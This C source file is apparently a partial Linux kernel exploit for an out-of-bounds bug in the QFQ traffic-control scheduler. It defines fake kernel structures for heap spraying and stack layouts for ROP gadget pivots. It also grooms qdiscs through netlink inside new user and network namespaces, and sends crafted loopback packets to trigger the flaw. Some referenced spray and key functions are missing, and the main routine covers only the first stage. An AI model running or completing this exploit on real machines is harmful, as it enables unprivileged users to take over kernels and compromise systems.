#define _GNU_SOURCE
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/keyctl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/if_packet.h>
#include <linux/pkt_cls.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>
#include <netinet/in.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;

_Static_assert (sizeof(u8) == 1, "sizeof(u8) != 1");
_Static_assert (sizeof(u16) == 2, "sizeof(u16) != 2");
_Static_assert (sizeof(u32) == 4, "sizeof(u32) != 4");
_Static_assert (sizeof(u64) == 8, "sizeof(u64) != 8");
_Static_assert (sizeof(i8) == 1, "sizeof(i8) != 1");
_Static_assert (sizeof(i16) == 2, "sizeof(i16) != 2");
_Static_assert (sizeof(i32) == 4, "sizeof(i32) != 4");
_Static_assert (sizeof(i64) == 8, "sizeof(i64) != 8");

#define L(fmt, ...) printf("INFO: " fmt "\n", ##__VA_ARGS__)
#define E(fmt, ...) printf("ERROR: " fmt "\n", ##__VA_ARGS__)

#define FAIL_IF(x) if ((x)) { \
    perror(#x); \
    return -1; \
}

#define PACK __attribute__((__packed__))

#define __EVENT_SET 0
#define __EVENT_UNSET 1

#define EVENT_DEFINE(name, init) volatile int name = init
#define EVENT_WAIT(name) while (__atomic_exchange_n(&name, __EVENT_UNSET, __ATOMIC_ACQUIRE) != __EVENT_SET) { usleep(1000); }

#define EVENT_UNSET(name) __atomic_store_n(&name, __EVENT_UNSET, __ATOMIC_RELEASE)
#define EVENT_SET(name) __atomic_store_n(&name, __EVENT_SET, __ATOMIC_RELEASE)

// Reverse calculation of the index in sch_qfq.c:qfq_calc_index
// Our desired index will be 27 so that the fake group resides at offset 288 into
// our large spray object.
#define _TARGET_INDEX 27
#define _MIN_SLOT_SHIFT 25
#define _NUM_CLS 1
#define _CLS_WEIGHT 1
#define _ONE_FP 0x40000000
#define LMAX ((1ull << (_TARGET_INDEX + _MIN_SLOT_SHIFT - 1 + 1)) / (_ONE_FP / (_CLS_WEIGHT * _NUM_CLS)) / _NUM_CLS)

#define SPRAY_8192 1
#define SPRAY_128 2

#define SIZEOF_USER_KEY_PAYLOAD 24

struct list_head {
  struct list_head *         next;                 /*     0     8 */
  struct list_head *         prev;                 /*     8     8 */

  /* size: 16, cachelines: 1, members: 2 */
  /* last cacheline: 16 bytes */
};

struct hlist_node {
  struct hlist_node *        next;                 /*     0     8 */
  struct hlist_node * *      pprev;                /*     8     8 */

  /* size: 16, cachelines: 1, members: 2 */
  /* last cacheline: 16 bytes */
};

struct qfq_aggregate_partial {
  // struct hlist_node          next;                 /*     0    16 */
  // u64                        S;                    /*    16     8 */
  u64                        F;                    /*    24     8 */
  struct qfq_group *         grp;                  /*    32     8 */
  u32                        class_weight;         /*    40     4 */
  int                        lmax;                 /*    44     4 */
  u32                        inv_w;                /*    48     4 */
  u32                        budgetmax;            /*    52     4 */
  u32                        initial_budget;       /*    56     4 */
  u32                        budget;               /*    60     4 */
  /* --- cacheline 1 boundary (64 bytes) --- */
  int                        num_classes;          /*    64     4 */

  u8 __pad0[4]; /* XXX 4 bytes hole, try to pack */

  struct list_head           active;               /*    72    16 */
  struct hlist_node          nonfull_next;         /*    88    16 */

  /* size: 104, cachelines: 2, members: 13 */
  /* sum members: 100, holes: 1, sum holes: 4 */
  /* last cacheline: 40 bytes */
} PACK;
_Static_assert(sizeof(struct qfq_aggregate_partial) == 104 - SIZEOF_USER_KEY_PAYLOAD);

struct tcf_proto_partial {
  // void*         next;                 /*     0     8 */
  // void *                     root;                 /*     8     8 */
  // int                        (*classify)(struct sk_buff *, const struct tcf_proto  *, struct tcf_result *); /*    16     8 */
  u16                     protocol;             /*    24     2 */

  /* XXX 2 bytes hole, try to pack */
  u8 __pad0[2];

  u32                        prio;                 /*    28     4 */
  void *                     data;                 /*    32     8 */
  const void  * ops;               /*    40     8 */
  struct tcf_chain *         chain;                /*    48     8 */
  u32                 lock;                 /*    56     4 */
  u8                       deleting;             /*    60     1 */

  /* XXX 3 bytes hole, try to pack */
  u8 __pad1[3];

  /* --- cacheline 1 boundary (64 bytes) --- */
  u32                 refcnt;               /*    64     4 */

  /* XXX 4 bytes hole, try to pack */
  u8 __pad2[4];

  u8       rcu[16];
  struct hlist_node          destroy_ht_node;      /*    88    16 */

  /* size: 104, cachelines: 2, members: 13 */
  /* sum members: 95, holes: 3, sum holes: 9 */
  /* forced alignments: 1, forced holes: 1, sum forced holes: 4 */
  /* last cacheline: 40 bytes */
} PACK;
_Static_assert(sizeof(struct tcf_proto_partial) == 104 - SIZEOF_USER_KEY_PAYLOAD);


struct tcf_proto_ops {
  struct list_head           head;                 /*     0    16 */
  char                       kind[16];             /*    16    16 */
  int                        (*classify)(void*, const void*, void*); /*    32     8 */
  int                        (*init)(void*); /*    40     8 */
  void                       (*destroy)(void*, u8, void*); /*    48     8 */
  void *                     (*get)(void*, u32); /*    56     8 */
  /* --- cacheline 1 boundary (64 bytes) --- */
  void                       (*put)(void*, void *); /*    64     8 */
  int                        (*change)(void*, void*, void*, long unsigned int, u32, void**, void **, u32, void*); /*    72     8 */
  int                        (*delete)(void*, void*, u8*, u8, void*); /*    80     8 */
  u8                       (*delete_empty)(void*); /*    88     8 */
  void                       (*walk)(void*, void*, u8); /*    96     8 */
  int                        (*reoffload)(void*, u8, void *, void *, void*); /*   104     8 */
  void                       (*hw_add)(void*, void *); /*   112     8 */
  void                       (*hw_del)(void*, void *); /*   120     8 */
  /* --- cacheline 2 boundary (128 bytes) --- */
  void                       (*bind_class)(void *, u32, long unsigned int, void *, long unsigned int); /*   128     8 */
  void *                     (*tmplt_create)(void*, void*, void**, void*); /*   136     8 */
  void                       (*tmplt_destroy)(void *); /*   144     8 */
  int                        (*dump)(void*, void*, void *, void*, void*, u8); /*   152     8 */
  int                        (*terse_dump)(void*, void*, void *, void*, void*, u8); /*   160     8 */
  int                        (*tmplt_dump)(void*, void*, void *); /*   168     8 */
  struct module *            owner;                /*   176     8 */
  int                        flags;                /*   184     4 */

  /* size: 192, cachelines: 3, members: 22 */
  /* padding: 4 */
} PACK;

struct hlist_head {
  struct hlist_node *        first;                /*     0     8 */

  /* size: 8, cachelines: 1, members: 1 */
  /* last cacheline: 8 bytes */
};

struct qfq_group {
  u64                        S;                    /*     0     8 */
  u64                        F;                    /*     8     8 */
  unsigned int               slot_shift;           /*    16     4 */
  unsigned int               index;                /*    20     4 */
  unsigned int               front;                /*    24     4 */

  u8 __pad0[4]; /* XXX 4 bytes hole, try to pack */

  long unsigned int          full_slots;           /*    32     8 */
  struct hlist_head          slots[32];            /*    40   256 */

  /* size: 296, cachelines: 5, members: 7 */
  /* sum members: 292, holes: 1, sum holes: 4 */
  /* last cacheline: 40 bytes */
} PACK;

typedef i32 key_serial_t;

struct rop_payload_head {
  struct tcf_proto_ops ops;
  u8 stack[0];
} PACK;

// Large spray payload (kmalloc-8192)
// This will host the fake qfq_group object in stage 1
// Eventually it will contain both the prepared stack and the tcf_proto_ops
// which the fake tcf_proto will reference
struct key_payload_large {
  struct {
    u8 __pad02[288 - SIZEOF_USER_KEY_PAYLOAD];
    struct qfq_group group;
  } PACK;
  struct rop_payload_head rop;
  u8 __pad2[4097 - sizeof(struct qfq_group) - 288 - sizeof(struct rop_payload_head)];
} PACK;
_Static_assert(sizeof(struct key_payload_large) == 4097 - SIZEOF_USER_KEY_PAYLOAD);
_Static_assert(__builtin_offsetof(struct key_payload_large, group) == 0x108);

// Small spray payload (104 bytes)
// Used for fake qfq_aggregate as well as fake tcf_proto
// In the case of tcf_proto, we overlay the structure with
// a temporary stack from which we will eventually pivot into
// the larger stack prepared in the larger payload.
// The stack is carefully crafted to not interfere with the rest
// of the structure.
struct key_payload_small {
  union {
    struct qfq_aggregate_partial agg;
    union {
      struct tcf_proto_partial tp;
      struct {
        // payload for pop rsp; add rsp, 0x18; pop rbx; pop rbp; pop r12; ret
        u8 __pad0[0x18 - SIZEOF_USER_KEY_PAYLOAD];
        u64 scratch_rbx;
        u64 rbp;
        u64 scratch_r12;
        u64 stack[1];
      } PACK;
      struct {
        // payload for push rsi; jmp qword ptr [rsi+0x39]
        u8 __pad1[0x39 - SIZEOF_USER_KEY_PAYLOAD];
        u64 jmp_target;
      } PACK;
    };
  };
} PACK;
_Static_assert(sizeof(struct key_payload_small) == 104 - SIZEOF_USER_KEY_PAYLOAD);


const struct key* get_key(unsigned index);

static int _pin_to_cpu(int id) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(id, &set);
  return sched_setaffinity(getpid(), sizeof(set), &set);
}

int final_stage_pid = 0;
void* final_stage_stack = NULL;

static struct key_payload_small agg; // SPRAY_128
static struct key_payload_large large; // SPRAY_8192
static key_serial_t id_agg;
static key_serial_t id_large;

static u64 leak_agg_ptr = 0;
static u64 leak_grp_ptr = 0;
static u64 leak_cls_rsvp_ops = 0;

//static u8* rop_payload = NULL;
//static u32 rop_payload_size = 0;

static u8* scratch_buf = NULL;

#ifndef DO_BEFORE
#define DO_BEFORE 1
#endif

#ifndef ATTEMPT_LARGE_EVERY
#define ATTEMPT_LARGE_EVERY 17
#endif
#ifndef ATTEMPT_SMALL_EVERY
#define ATTEMPT_SMALL_EVERY 27
#endif

void prep_stage1_large_payload(struct key_payload_large* large) {
  memset(large, 0, sizeof(*large));

  // This index will control the bit we flip.
  // (offsetof(struct qfq_sch, nonfull_aggs) - offsetof(struct qfq_sch, bitmaps)) * 8 + (FFS(0x80) = 7)
  large->group.index = 7440 * 8 + 7;
}

static int last_worker = 0;
static struct {
    int pid;
    void* stack;
} workers[200] = {0};

int spawn_worker(int (*target)(void*), void* arg) {
  void* stack = workers[last_worker].stack;

  if (stack == NULL) {
    stack = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    FAIL_IF(stack == MAP_FAILED);
    workers[last_worker].stack = stack;
  }

  int child = clone(target, stack + 0x4000, CLONE_NEWUSER | CLONE_NEWNET | CLONE_VM, arg);

  if (child < 0) {
    return -1;
  }

  workers[last_worker].pid = child;
  last_worker++;

  return last_worker - 1;
}

int kill_worker(int index) {
  if (workers[index].pid > 0) {
    kill(workers[index].pid, SIGKILL);
    workers[index].pid = -1;

    if (index == last_worker - 1) {
      last_worker--;
    }

    return 0;
  }

  E("worker %d does not exist?", index);
  return -1;
}

int netlink_errno(int fd, struct nlmsghdr* nlh) {
  assert(nlh->nlmsg_type == NLMSG_ERROR);
  struct nlmsgerr* e = NLMSG_DATA(nlh);
  assert(nlh->nlmsg_len >= NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(*e)));

  if (e->error != 0) {
    E("netlink error: %d", e->error);
    errno = -e->error;
  }

  return e->error;
}

int netlink_send_recv(int fd, void* buf, int size) {
  struct iovec iov = {
    .iov_base = buf,
    .iov_len = size,
  };
  struct msghdr msg = {
    .msg_name = NULL,
    .msg_namelen = 0,
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0,
  };
  if (sendmsg(fd, &msg, 0) < 0) {
    perror("sendmsg()");
    return -1;
  }

  msg.msg_flags = MSG_TRUNC;
  msg.msg_iov = NULL;
  msg.msg_iovlen = 0;
  iov.iov_len = recvmsg(fd, &msg, MSG_PEEK | MSG_TRUNC);
  if (iov.iov_len < 0) {
    perror("recvmsg()");
    return -1;
  }
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  return recvmsg(fd, &msg, 0);
}

volatile int wake = 0;
volatile int done = 0;
// event which will be set whenever control is handed over back to main
static EVENT_DEFINE(parent_notify, __EVENT_UNSET);
// event which will be set whenever control is handed over back to the final stage worker
static EVENT_DEFINE(final_worker_notify, __EVENT_UNSET);

int prepare_device(int s, int ifindex) {
  struct nlmsghdr* nlh = calloc(1, 4096);
  FAIL_IF(nlh == NULL);

  struct ifinfomsg* data = NLMSG_DATA(nlh);
  nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
  nlh->nlmsg_type = RTM_NEWLINK;
  nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  nlh->nlmsg_seq = 0;
  nlh->nlmsg_pid = 0;

  // Up the device
  data->ifi_family = PF_UNSPEC;
  data->ifi_type = 0;
  data->ifi_index = ifindex;
  data->ifi_flags = IFF_UP;
  data->ifi_change = 1;

  struct nlattr* attr = NLMSG_DATA(nlh) + NLMSG_ALIGN(sizeof(*data));
  attr->nla_type = IFLA_MTU;
  attr->nla_len = NLA_HDRLEN + 4;
  u32* attr_data = (void*)attr + NLA_HDRLEN;
  *attr_data = 0x1000;

  nlh->nlmsg_len += attr->nla_len;

  int recvlen = netlink_send_recv(s, nlh, nlh->nlmsg_len);
  if (recvlen < 0) {
    perror("recv()");
    free(nlh);
    return -1;
  }

  if (netlink_errno(s, nlh) != 0) {
    E("failed to prepare device!");
    free(nlh);
    return -1;
  }

  free(nlh);
  return 0;
}
// Create a netem qdisc with a large delay, used to slow down the enqueue / dequeue logic
int create_netem_qdisc(int s, int ifindex, u32 parent, u32 handle) {
  struct nlmsghdr* nlh = calloc(2, 8192);
  struct tcmsg* data = NLMSG_DATA(nlh);
  nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
  nlh->nlmsg_type = RTM_NEWQDISC;
  nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;
  nlh->nlmsg_seq = 0;
  nlh->nlmsg_pid = 0;

  data->tcm_family = PF_UNSPEC;
  data->tcm_ifindex = ifindex;
  data->tcm_parent = parent;
  data->tcm_handle = handle & 0xFFFF0000;

  struct nlattr* attr = NLMSG_DATA(nlh) + NLMSG_ALIGN(sizeof(*data));
  do {
    attr->nla_type = TCA_KIND;
    attr->nla_len = NLA_HDRLEN + NLA_ALIGN(strlen("netem") + 1);

    char* attr_data = (char*)attr + NLA_HDRLEN;
    strcpy(attr_data, "netem");

    nlh->nlmsg_len += attr->nla_len;
    attr = (void*)attr + attr->nla_len;

    attr->nla_type = TCA_OPTIONS;
    attr->nla_len = NLA_HDRLEN + sizeof(struct tc_netem_qopt);

    struct tc_netem_qopt* netem_qopt = (void*)attr + NLA_HDRLEN;
    netem_qopt->latency = 1000u * 1000 * 5000; // latency in us
    // this limit is important:
    // we want the first packet to be delayed indefinitely, but
    // the second packet, which triggers the vuln, to be dropped.
    netem_qopt->limit = 1;

    nlh->nlmsg_len += attr->nla_len;
    attr = (void*)attr + attr->nla_len;
  } while (0);

  int recvlen = netlink_send_recv(s, nlh, nlh->nlmsg_len);
  if (recvlen < 0) {
    perror("recv()");
    free(nlh);
    return -1;
  }

  if (netlink_errno(s, nlh) != 0) {
    E("failed to create netem qdisc!");
    free(nlh);
    return -1;
  }

  free(nlh);
  return 0;
}

// Create a qfq qdisc, main qdisc of interest
int create_qfq_qisc(int s, int ifindex, u32 parent, u32 handle, int with_stab) {
  struct nlmsghdr* nlh = calloc(1, 4096);

  struct tcmsg* data = NLMSG_DATA(nlh);
  nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
  nlh->nlmsg_type = RTM_NEWQDISC;
  nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;
  nlh->nlmsg_seq = 0;
  nlh->nlmsg_pid = 0;

  data->tcm_family = PF_UNSPEC;
  data->tcm_ifindex = ifindex;
  data->tcm_parent = TC_H_ROOT;
  data->tcm_handle = handle & 0xFFFF0000;

  struct nlattr* attr = NLMSG_DATA(nlh) + NLMSG_ALIGN(sizeof(*data));

  do {
    attr->nla_type = TCA_KIND;
    attr->nla_len = NLA_HDRLEN + NLA_ALIGN(strlen("qfq") + 1);

    char* attr_data = (char*)attr + NLA_HDRLEN;
    strcpy(attr_data, "qfq");

    nlh->nlmsg_len += attr->nla_len;
    attr = (void*)attr + attr->nla_len;

    if (with_stab) {
      // Prepare the sizetable. This sizetable is used to trigger
      // the vulnerability.
      // Essentially we setup a lookup table where the resulting
      // packet size equals to (table[in_size >> 9] << 7)
      // We choose those bitshifts to have some room for packet headers
      // that we do not have to care about.
      attr->nla_type = TCA_STAB;
      attr->nla_len = NLA_HDRLEN;

      struct nlattr* nested = (void*)attr + NLA_HDRLEN;
      nested->nla_type = TCA_STAB_BASE;
      nested->nla_len = NLA_HDRLEN + sizeof(struct tc_sizespec);
      attr->nla_len += nested->nla_len;

      struct tc_sizespec* sizespec = (void*)nested + NLA_HDRLEN;
      sizespec->cell_log = 9;
      sizespec->size_log = 7;
      sizespec->cell_align = 0;
      sizespec->overhead = 0;
      sizespec->linklayer = 0;
      sizespec->mpu = 0;
      sizespec->mtu = 0;
      sizespec->tsize = 2;

      nested = (void*)nested + nested->nla_len;
      nested->nla_type = TCA_STAB_DATA;
      nested->nla_len = NLA_HDRLEN + 2 * sizeof(u16);
      attr->nla_len += nested->nla_len;

      *((u16*)((void*)nested + NLA_HDRLEN) + 0) = 0;
      // This is the size that triggers the vulnerability
      *((u16*)((void*)nested + NLA_HDRLEN) + 1) = LMAX >> 7;

      nlh->nlmsg_len += attr->nla_len;
      attr = (void*)attr + attr->nla_len;
    }
  } while (0);

  int recvlen = netlink_send_recv(s, nlh, nlh->nlmsg_len);
  if (recvlen < 0) {
    perror("recv()");
    free(nlh);
    return -1;
  }

  if (netlink_errno(s, nlh) != 0) {
    E("failed to create qfq qdisc!");
    free(nlh);
    return -1;
  }

free(nlh);
return 0;
}

// Add a helper class to a qdisc
int create_helper_class(int s, int ifindex, u32 class_handle, u32 sub_qdisc_handle, u32 lmax) {
  struct nlmsghdr* nlh = calloc(1, 4096);

  struct tcmsg* data = NLMSG_DATA(nlh);
  nlh->nlmsg_len = sizeof(*data) + NLMSG_HDRLEN;
  nlh->nlmsg_type = RTM_NEWTCLASS;
  nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE;
  nlh->nlmsg_seq = 0;
  nlh->nlmsg_pid = 0;

  data->tcm_family = PF_UNSPEC;
  data->tcm_ifindex = ifindex;
  data->tcm_parent = TC_H_ROOT;
  data->tcm_handle = class_handle;


  struct nlattr* attr = NLMSG_DATA(nlh) + NLMSG_ALIGN(sizeof(*data));
  struct nlattr* nested;

  do {
    attr->nla_type = TCA_OPTIONS;
    attr->nla_len = NLA_HDRLEN + NLA_HDRLEN + sizeof(u32);

    nested = (void*)attr + NLA_HDRLEN;
    nested->nla_type = TCA_QFQ_LMAX;
    nested->nla_len = NLA_HDRLEN + sizeof(u32);
    *(u32*)((void*)nested + NLA_HDRLEN) = lmax;

    nlh->nlmsg_len += attr->nla_len;
    attr = (void*)attr + attr->nla_len;
  } while (0);

  int recvlen = netlink_send_recv(s, nlh, nlh->nlmsg_len);
  if (recvlen < 0) {
    perror("recv()");
    free(nlh);
    return -1;
  }

  if (netlink_errno(s, nlh) != 0) {
    E("failed to create helper class!");
    free(nlh);
    return -1;
  }
  free(nlh);

  if (sub_qdisc_handle != 0) {
    return create_netem_qdisc(s, ifindex, class_handle, sub_qdisc_handle);
  }

  return 0;
}


// Worker to spray qdiscs and potentially trigger the vulnerabilty.
// Each worker will have its own network namespace and create qdiscs
// for the loopback device.
// We could create virtual devices, but here we are.
int bug_worker(void* arg) {
  int i = *(int*)arg;

  const u32 handle = 0x10000000 | (i << 16);
  const u32 handle_oob = handle | (1 << 0);
  const u32 handle_help = handle | (1 << 1);
  const u32 handle_faked1 = handle | (1 << 2);

  const u32 sub_handle_help = 0x20010000;
  const u32 sub_handle_oob = 0x20020000;

  const int loindex = if_nametoindex("lo");

  int s = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  FAIL_IF(s < 0);

  struct sockaddr_nl addr = {0};
  addr.nl_family = AF_NETLINK;

  FAIL_IF(bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0);

  if (prepare_device(s, loindex) < 0) {
    return -1;
  }

  // Prepare qfq qdisc without anything else.
  // Eventually we will create everything of interest when we pull the trigger.
  // Until that this qdisc serves as some kind of "grooming" object
  // Note that this qdisc is created with a specifically chosen TCA_STAB
  // so that we can trigger the vulnerability.
  if (create_qfq_qisc(s, loindex, TC_H_ROOT, handle, 1) < 0) {
    return -1;
  }

  EVENT_SET(parent_notify);

  while (!done) {
    while (wake != i) {
      sleep(1);
    }
    wake = 0;

    L("worker %d is entering stage 1: trigger vulnerability", i);

    L("trying to prepare helper class ..");
    // This is a real helper class: We use it to make the code below follow
    // certain paths in sch_qfq.c
    // We require the following:
    //  - qfq_sch->in_serv_agg != NULL
    //  - qfq_sch->in_serv_agg != OOB agg
    // We use a netem qdisc with a large delay to consistently hit the window
    // between qfq_enqueue -> qfq_dequeue where the in_serv_agg would be reset.
    if (create_helper_class(s, loindex, handle_help, sub_handle_help, 0x1000) != 0) {
      E("failed to create helper class :(");
      return -1;
    }

    L("trying to prepare oob class ..");
    // Class which will carry the aggregate with the OOB group
    // In order to hit the desired update code paths, this class needs
    // packets in its (sub)qdisc. Additionally we ideally want to drop the
    // packet that causes the OOB group to be created.
    // We use the same netem qdisc for this, additionally the netem qdisc will
    // have a limit of 1 dropping all packets after the first one.
    if (create_helper_class(s, loindex, handle_oob, sub_handle_oob, 0x2000) != 0) {
      E("failed to create oob class :(");
      return -1;
    }

    L("activating helper agg ..");
    u8 buf[1 << 9] = {0};

    int sc, ss;
    struct sockaddr_in addr;
    u32 addr_len;

    ss = socket(AF_INET, SOCK_DGRAM, 0);
    FAIL_IF(ss < 0);
    sc = socket(AF_INET, SOCK_DGRAM, 0);
    FAIL_IF(sc < 0);

    addr.sin_family = AF_INET;
    addr.sin_port = 0;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    addr_len = sizeof(addr);

    FAIL_IF(bind(ss, (struct sockaddr*)&addr, addr_len) < 0);
    FAIL_IF(getsockname(ss, (struct sockaddr*) &addr, &addr_len) < 0)

    // set in_serv_agg = helper agg
    FAIL_IF(setsockopt(sc, SOL_SOCKET, SO_PRIORITY, &handle_help, sizeof(handle_help)) < 0);
    FAIL_IF(sendto(sc, buf, 1, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0);

    // make (not-yet) oob class active
    FAIL_IF(setsockopt(sc, SOL_SOCKET, SO_PRIORITY, &handle_oob, sizeof(handle_oob)) < 0);
    FAIL_IF(sendto(sc, buf, 1, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0);

    // trigger vulnerability
    // note that this packet will be dropped by the child (netem) qdisc
    FAIL_IF(sendto(sc, buf, 1 << 9, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0);

    close(ss);
    close(sc);

    L("waking parent");
    EVENT_SET(parent_notify);

    while (wake != i) {
      sleep(1);
    }
    wake = 0;
  }

  return 0;
}

int main() {
  // main orchestration routine.
  // mainly manages workers and occasionally collects leak information

  FAIL_IF(_pin_to_cpu(0) != 0);

  scratch_buf = calloc(16, 0x1000);
  FAIL_IF(scratch_buf == NULL);

  int worker_i = 1;
  prep_stage1_large_payload(&large);
  for (worker_i = 1; worker_i <= ATTEMPT_LARGE_EVERY*3; worker_i++) {
    int do_the_thing = (worker_i % ATTEMPT_LARGE_EVERY == 0);
    
    FAIL_IF(spawn_worker(&bug_worker, &worker_i) < 0);
    EVENT_WAIT(parent_notify);

    if (do_the_thing) {
      wake = worker_i;
      EVENT_WAIT(parent_notify);
      
      E("attempt failed. trying again ..");
      prep_stage1_large_payload(&large);
    }
  }
  return 0;
}
